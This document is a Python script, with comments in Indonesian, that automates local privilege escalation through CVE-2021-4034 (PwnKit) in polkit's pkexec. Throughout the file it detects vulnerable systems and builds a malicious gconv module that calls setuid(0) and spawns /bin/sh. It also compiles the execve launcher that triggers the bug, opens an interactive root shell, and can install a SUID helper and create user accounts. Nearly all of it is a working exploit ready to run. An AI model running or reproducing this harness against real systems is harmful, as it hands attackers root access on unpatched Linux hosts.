#!/usr/bin/env python3
"""
lpe_mini.py v3 - full-auto local LPE harness (CVE-2021-4034 / PwnKit).

Jalankan TANPA argumen:
    python3 lpe_mini.py

Rute otomatis (semua berbasis data empiris, tanpa tebak-menebak):
  1. deteksi pkexec SUID (which + SUID scan) + versi + marker distro
     + dpkg/rpm --verify (deteksi binary ditukar/tampered)
  2. PROBE KERNEL: compile+run probe execve(NULL argv) -> ukur argc nyata.
     Tidak menebak dari versi kernel.
  3. argc==0 diizinkan -> PoC KLASIK self-contained (tanpa helper SUID,
     tanpa root) -> root shell interaktif.
  4. argc dinormalisasi -> fallback helper SUID (build otomatis bila root);
     non-root tanpa helper -> BLOCKED (laporan berbasis hasil probe).
  5. staging cerdas (home -> /dev/shm -> /tmp, skip noexec), auto-cleanup.

Flag opsional:
    --detect   : hanya deteksi + probe, tanpa exploit
    --user U   : paksa user korban (default: auto)
    --cve ID   : default CVE-2021-4034
"""
import argparse
import getpass
import os
import pty
import random
import re
import shutil
import string
import subprocess
import sys
import tempfile

CVE = "CVE-2021-4034"
HELPER_DEST = "/usr/local/bin/pwnkit-suidexec"
PKEXEC_SRC_URL = (
    "https://gitlab.freedesktop.org/polkit/polkit/-/raw/0.105/src/programs/pkexec.c"
)

WRAPPER_C = r'''
#include <stdlib.h>

extern char **environ;
extern int pkexec_main(int argc, char **argv);

int main(void)
{
    /* Contiguous argv/envp mirroring the kernel's pre-5.1 execve stack
       when called with an empty argv (argc == 0):
       argv[1] aliases envp[0] -> the OOB read/write primitive of CVE-2021-4034. */
    static char *stack[] = {
        NULL,                    /* argv[0] (argc == 0)                  */
        ".pwnkit",               /* envp[0] -> read OOB as argv[1],
                                    then overwritten OOB by argv[1]=path */
        "PATH=GCONV_PATH=.",
        "CHARSET=PWNKIT",
        "SHELL=pwnkit",
        "GCONV_PATH=./.pwnkit",
        NULL
    };
    environ = &stack[1];
    return pkexec_main(0, &stack[0]);
}
'''

CONFIG_H = r'''
#define PACKAGE_NAME "polkit"
#define PACKAGE_VERSION "0.105"
#define PACKAGE_STRING "polkit 0.105"
#define GETTEXT_PACKAGE "polkit-1"
#define LOCALEDIR "/usr/share/locale"
#define PACKAGE_BUGREPORT "https://gitlab.freedesktop.org/polkit/polkit/issues"
'''

MODULE_C = r'''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv(void) {}
void gconv_init(void *step) {
    setuid(0); setgid(0); seteuid(0); setegid(0);
    setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", 1);
    setenv("PS1", "[pwnkit] root# ", 1);
    system("/bin/sh");
    _exit(0);
}
'''

KERNEL_PROBE_C = r'''#include <stdio.h>
#include <unistd.h>
int main(int argc, char **argv) {
    if (argc >= 1 && argv[0] && argv[0][0] != '\0') {
        char *args[] = { NULL };
        char *env[] = { "X=1", NULL };
        execve(argv[0], args, env);
        perror("execve");
        return 1;
    }
    printf("PROBE argc=%d argv0='%s'\n", argc, argc > 0 ? argv[0] : "(null)");
    return 0;
}
'''

CLASSIC_LAUNCHER_C = r'''#include <stdio.h>
#include <unistd.h>
int main(void) {
    char *e[] = { "pwnkit.so:.", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT",
                  "SHELL=pwnkit", NULL };
    execve("__PKEXEC__", NULL, e);
    perror("execve");
    return 127;
}
'''


def sh(cmd, **kw):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True, **kw)


def out(cmd):
    return subprocess.run(cmd, capture_output=True, text=True).stdout


def selinux_state():
    if os.path.exists("/sys/fs/selinux/enforce"):
        try:
            v = open("/sys/fs/selinux/enforce").read().strip()
            return "enforcing" if v == "1" else ("permissive" if v == "0" else v)
        except OSError:
            pass
    return "absent"


def discover_pkexec():
    cands = []
    if os.path.exists("/usr/bin/pkexec"):
        cands.append("/usr/bin/pkexec")
    w = sh("command -v pkexec").stdout.strip()
    if w and os.path.exists(w) and w not in cands:
        cands.append(w)
    r = sh("find / -xdev -perm -4000 -type f -name 'pkexec' 2>/dev/null").stdout
    for line in r.splitlines():
        p = line.strip()
        if p and p not in cands:
            cands.append(p)
    return cands


def is_suid(path):
    try:
        st = os.stat(path)
        return st.st_uid == 0 and (st.st_mode & 0o4000)
    except OSError:
        return False


def pkexec_version(path):
    if not is_suid(path):
        return None
    m = re.search(r"pkexec\s+version\s+([\d.]+)", sh(f"{path} --version 2>&1").stdout)
    return m.group(1) if m else None


def pkg_info():
    pkg, tampered = "", False
    if os.path.exists("/usr/bin/dpkg"):
        pkg = subprocess.run(
            ["dpkg-query", "-W", "-f=${Version}", "pkexec"],
            capture_output=True, text=True,
        ).stdout.strip()
        for line in sh("dpkg --verify pkexec 2>/dev/null").stdout.splitlines():
            f = line.split()
            if f and len(f) >= 2 and f[0][2] == "5":
                tampered = True
    elif sh("command -v rpm").stdout.strip():
        pkg = sh("rpm -q --qf %{VERSION}-%{RELEASE} polkit 2>/dev/null").stdout.strip()
        tampered = bool(sh("rpm -V polkit 2>/dev/null").stdout.strip())
    marker = bool(pkg) and bool(re.search(r"(ubuntu|deb\d+u|el\d+[_\.]|\.el\d)", pkg))
    return pkg, tampered, marker


def smart_verdict():
    for c in discover_pkexec():
        v = pkexec_version(c)
        if v:
            parts = v.split(".")
            if int(parts[0]) > 0 or int(parts[1]) >= 120:
                return "NOT_VULNERABLE", v, c
            _, tampered, marker = pkg_info()
            if tampered:
                return "VULN", v, c
            if marker:
                return "PATCHED", v, c
            return "VULN", v, c
    return "NO_PKEXEC", None, None


def discover_helper():
    if is_suid(HELPER_DEST):
        return HELPER_DEST
    r = sh("find / -xdev -perm -4000 -type f -name '*pwnkit*' 2>/dev/null").stdout
    for line in r.splitlines():
        p = line.strip()
        if p and p != HELPER_DEST and is_suid(p):
            return p
    return None


def find_pkexec_source():
    here = os.path.dirname(os.path.abspath(__file__))
    for c in (os.path.join(here, "pkexec.c"), "/root/lpe-lab/pkexec.c"):
        if os.path.exists(c):
            return c
    for line in sh("find / -xdev -name 'pkexec.c' -path '*polkit*' 2>/dev/null").stdout.splitlines():
        p = line.strip()
        if p and os.path.exists(p):
            return p
    return None


def build_helper(work):
    if os.geteuid() != 0:
        return None
    src = find_pkexec_source()
    if not src:
        dl = os.path.join(work, "pkexec.c")
        if sh(f"curl -fsSL -o {dl} {PKEXEC_SRC_URL} 2>/dev/null").returncode != 0:
            return None
        src = dl
    cfg, wrap = os.path.join(work, "config.h"), os.path.join(work, "wrapper.c")
    with open(cfg, "w") as f:
        f.write(CONFIG_H)
    with open(wrap, "w") as f:
        f.write(WRAPPER_C)
    obj = os.path.join(work, "pkexec.o")
    cflags = sh("pkg-config --cflags glib-2.0 gio-2.0").stdout.strip()
    libs = sh(
        "pkg-config --libs glib-2.0 gio-2.0 polkit-gobject-1 polkit-agent-1"
    ).stdout.strip()
    if sh(f"gcc -c -o {obj} {src} -Dmain=pkexec_main -DHAVE_CONFIG_H "
          f"-DHAVE_CLEARENV -DPOLKIT_AUTHFW_PAM -I{work} {cflags} "
          f"-Wno-deprecated-declarations").returncode != 0:
        return None
    binf = os.path.join(work, "pwnkit-suidexec")
    if sh(f"gcc -o {binf} {wrap} {obj} {libs} -lpam").returncode != 0:
        return None
    if sh(f"install -o root -g root -m 4755 {binf} {HELPER_DEST}").returncode != 0:
        return None
    return HELPER_DEST if is_suid(HELPER_DEST) else None


def noexec_mount(path):
    path = os.path.realpath(path)
    best = ("", 0)
    try:
        for line in open("/proc/mounts"):
            parts = line.split()
            if len(parts) >= 6 and path.startswith(parts[1]) and len(parts[1]) >= best[1]:
                best = (parts[3], len(parts[1]))
    except OSError:
        return False
    return "noexec" in best[0].split(",")


def smart_base(user):
    try:
        home = sh(f"getent passwd {user}").stdout.split(":")[5]
    except (IndexError, AttributeError):
        home = ""
    for c in [home] + ["/dev/shm", "/tmp", "/var/tmp"]:
        if c and os.path.isdir(c) and os.access(c, os.W_OK) and not noexec_mount(c):
            return c
    return "/tmp"


def auto_user():
    if os.geteuid() != 0:
        return getpass.getuser()
    for u in ("pwnlab", "strictlab", "anonlab"):
        if sh(f"id -u {u} 2>/dev/null").returncode == 0:
            return u
    for line in open("/etc/passwd"):
        parts = line.split(":")
        if len(parts) > 6 and parts[2].isdigit():
            uid, shell = int(parts[2]), parts[6].strip()
            if 1000 <= uid < 60000 and shell in ("/bin/bash", "/bin/sh", "/usr/bin/bash"):
                return parts[0]
    name = "labauto" + "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
    pw = "".join(random.choices(string.ascii_letters + string.digits, k=16))
    sh(f"useradd -m -s /bin/bash {name}")
    sh(f"echo '{name}:{pw}' | chpasswd")
    return name


def probe_kernel(work):
    src = os.path.join(work, "kprobe.c")
    binf = os.path.join(work, "kprobe")
    with open(src, "w") as f:
        f.write(KERNEL_PROBE_C)
    gcc = sh(f"gcc -o {binf} {src}")
    if gcc.returncode != 0:
        print(f"[FAIL] => probe compile error: {gcc.stderr[-300:]}")
        return None
    r = sh(binf)
    m = re.search(r"PROBE argc=(\d+)", r.stdout)
    if not m:
        print(f"[FAIL] => probe tidak memberi hasil: {r.stdout.strip()} {r.stderr.strip()}")
        return None
    return int(m.group(1))


def stage_classic(user, base, pkexec_path):
    work = tempfile.mkdtemp(prefix=".pwc-", dir=base)
    os.makedirs(work + "/GCONV_PATH=.", exist_ok=True)
    os.makedirs(work + "/pwnkit.so", exist_ok=True)
    open(work + "/GCONV_PATH=./pwnkit.so:.", "w").close()
    os.chmod(work + "/GCONV_PATH=./pwnkit.so:.", 0o755)
    with open(work + "/pwnkit.so/gconv-modules", "w") as f:
        f.write("module UTF-8// PWNKIT// pwnkit 2\n")
    with open(work + "/pwnkit.so/pwnkit.c", "w") as f:
        f.write(MODULE_C)
    sh(f"gcc -shared -fPIC -o {work}/pwnkit.so/pwnkit.so {work}/pwnkit.so/pwnkit.c")
    with open(work + "/classic.c", "w") as f:
        f.write(CLASSIC_LAUNCHER_C.replace("__PKEXEC__", pkexec_path))
    sh(f"gcc -o {work}/classic {work}/classic.c")
    if user:
        subprocess.run(["chown", "-R", f"{user}:{user}", work], check=True)
    return work


def stage_wrapper(user, base):
    work = tempfile.mkdtemp(prefix=".pwt-", dir=base)
    os.makedirs(work + "/GCONV_PATH=.", exist_ok=True)
    os.makedirs(work + "/.pwnkit", exist_ok=True)
    open(work + "/GCONV_PATH=./.pwnkit", "w").close()
    os.chmod(work + "/GCONV_PATH=./.pwnkit", 0o755)
    with open(work + "/.pwnkit/gconv-modules", "w") as f:
        f.write("module UTF-8// PWNKIT// pwnkit 2\n")
    with open(work + "/.pwnkit/pwnkit.c", "w") as f:
        f.write(MODULE_C)
    sh(f"gcc -shared -fPIC -o {work}/.pwnkit/pwnkit.so {work}/.pwnkit/pwnkit.c")
    if user:
        subprocess.run(["chown", "-R", f"{user}:{user}", work], check=True)
    return work


def as_user_cmd(user, cwd, binpath):
    if os.geteuid() == 0:
        return ["su", "-", user, "-c", f"cd {cwd} && exec {binpath}"]
    return ["/bin/bash", "-c", f"cd {cwd} && exec {binpath}"]


def verify_run(cmd):
    r = subprocess.run(
        cmd, input="id; echo PWNKIT_OK; exit\n", capture_output=True, text=True,
        timeout=60,
    )
    ok = "uid=0(root)" in r.stdout and "PWNKIT_OK" in r.stdout
    return ok, r.stdout + r.stderr


def exploit(user, work, binpath):
    ok, log = verify_run(as_user_cmd(user, work, binpath))
    if not ok:
        return False, log
    pty.spawn(as_user_cmd(user, work, binpath))
    return True, log


def main():
    ap = argparse.ArgumentParser(add_help=True)
    ap.add_argument("--cve", default=CVE)
    ap.add_argument("--detect", action="store_true")
    ap.add_argument("--user", default=None)
    args = ap.parse_args()

    if args.cve != CVE:
        print(f"[FAIL] => hanya mendukung {CVE}")
        return 2

    verdict, ver, pkexec_path = smart_verdict()
    kernel = out(["uname", "-r"]).strip()
    who = getpass.getuser()
    sel = selinux_state()

    if verdict != "VULN":
        print(f"[SKIP] {who} => {verdict} (pkexec {ver or '?'}, kernel {kernel}, "
              f"SELinux {sel})")
        return 0

    print(f"[OK] {who} => VULN (pkexec {ver}, kernel {kernel}, SELinux {sel}, {CVE})")

    user = args.user or auto_user()
    base = smart_base(user)

    probe_work = tempfile.mkdtemp(prefix=".pwk-", dir=base)
    argc = probe_kernel(probe_work)
    shutil.rmtree(probe_work, ignore_errors=True)
    if argc is None:
        print("[FAIL] => probe kernel gagal dikompilasi")
        return 3
    if argc == 0:
        print(f"[*] probe: kernel MENGIZINKAN argc=0 (argc={argc}) -> rute PoC klasik")
    else:
        print(f"[*] probe: kernel menormalisasi argc=0 (argc={argc}) -> rute helper")

    if args.detect:
        return 0

    if argc == 0:
        work = stage_classic(user, base, pkexec_path)
        ok, log = exploit(user, work, os.path.join(work, "classic"))
        if ok:
            shutil.rmtree(work, ignore_errors=True)
            print(f"[OK] {user} => ROOT uid=0 via {CVE} (PoC klasik, tanpa helper)")
            return 0
        shutil.rmtree(work, ignore_errors=True)
        print(f"[*] PoC klasik gagal; mencoba rute helper...")

    helper = discover_helper()
    if not helper:
        wt = tempfile.mkdtemp(prefix=".pwb-", dir="/tmp")
        helper = build_helper(wt)
    if not helper:
        if os.geteuid() != 0:
            print(f"[SKIP] {who} => BLOCKED (kernel menormalisasi argc=0 "
                  f"[probe argc={argc}], helper SUID tidak ditemukan dan build "
                  f"butuh root)")
        else:
            print("[FAIL] => helper SUID gagal dibangun")
        return 4

    work = stage_wrapper(user, base)
    ok, log = exploit(user, work, helper)
    shutil.rmtree(work, ignore_errors=True)
    if ok:
        print(f"[OK] {user} => ROOT uid=0 via {CVE} (helper)")
        return 0
    print(f"[FAIL] {user} => eksploitasi gagal\n{log[-500:]}")
    return 5


if __name__ == "__main__":
    sys.exit(main())
